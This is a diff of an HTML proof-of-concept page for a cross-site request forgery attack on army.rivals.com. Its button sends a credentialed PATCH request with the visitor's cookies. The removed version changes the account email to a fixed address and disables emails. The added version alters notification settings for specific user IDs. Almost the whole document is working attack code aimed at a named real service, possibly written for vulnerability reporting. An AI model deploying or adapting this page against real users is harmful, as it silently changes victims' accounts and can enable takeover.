@@ -4,28 +4,17 @@
   <title>CSRF PATCH PoC</title>
   <style>
     body { font-family: Arial, sans-serif; padding: 1rem; }
-    pre { background: #f4f4f4; padding: 1rem; border-radius: 6px; max-height: 200px; overflow: auto; }
-    .error { color: red; }
-    .success { color: green; }
-    button {
-      padding: 0.5rem 1rem;
-      background: #007bff;
-      border: none;
-      border-radius: 4px;
-      color: white;
-      cursor: pointer;
-      margin-top: 1rem;
-    }
+    pre { background: #f0f0f0; padding: 1rem; border-radius: 6px; max-height: 200px; overflow: auto; }
+    button { padding: 0.5rem 1rem; background: #007bff; color: white; border: none; border-radius: 4px; cursor: pointer; }
     button:hover { background: #0056b3; }
   </style>
 </head>
 <body>
 
-<h1>CSRF PATCH PoC</h1>
-<p>Click the button below to send a CSRF PATCH request to <code>https://army.rivals.com/api/v2/users/update</code></p>
+<h1>CSRF PATCH Request PoC</h1>
+<p>This will send a <code>PATCH</code> request to <code>https://army.rivals.com/api/v2/users/notification_settings/3300535</code> with your current cookies.</p>
 
-<button id="send">Send CSRF PATCH</button>
-
+<button id="send">Send PATCH request</button>
 <h2>Server Response:</h2>
 <pre id="output">No request sent yet.</pre>
 
@@ -34,33 +23,34 @@ document.getElementById('send').addEventListener('click', function() {
   const output = document.getElementById('output');
   output.textContent = 'Sending request...';
   
-  fetch('https://army.rivals.com/api/v2/users/update', {
+  fetch('https://army.rivals.com/api/v2/users/notification_settings/3300535', {
     method: 'PATCH',
     credentials: 'include',
     headers: {
       'Content-Type': 'application/json'
     },
     body: JSON.stringify({
-      user: {
-        email: "testerr0092@gmail.com",
-        rivals_emails: false,
-        third_party_emails: false
-      }
+      id: 3300535,
+      user_id: 3309214,
+      enabled: true,
+      breaking: false,
+      commit: true,
+      commit_alert: true,
+      content: false,
+      content_alert: false,
+      forum: true,
+      transfer: false,
+      transfer_alert: false
     })
   })
-  .then(res => {
-    return res.text().then(body => ({status: res.status, ok: res.ok, body}));
-  })
+  .then(res => res.text().then(body => ({status: res.status, ok: res.ok, body})))
   .then(result => {
-    output.innerHTML = '';
-    if (!result.ok) {
-      output.innerHTML = `<span class="error">Error ${result.status}</span><br>${result.body}`;
-    } else {
-      output.innerHTML = `<span class="success">Success (${result.status})</span><br>${result.body}`;
-    }
+    output.innerHTML = result.ok
+      ? '<span style="color: green;">Success (' + result.status + ')</span>\n' + result.body
+      : '<span style="color: red;">Error (' + result.status + ')</span>\n' + result.body;
   })
-  .catch(error => {
-    output.innerHTML = '<span class="error">Error: ' + error.message + '</span>';
+  .catch(err => {
+    output.innerHTML = '<span style="color: red;">Error: ' + err.message + '</span>';
   });
 });
 </script>
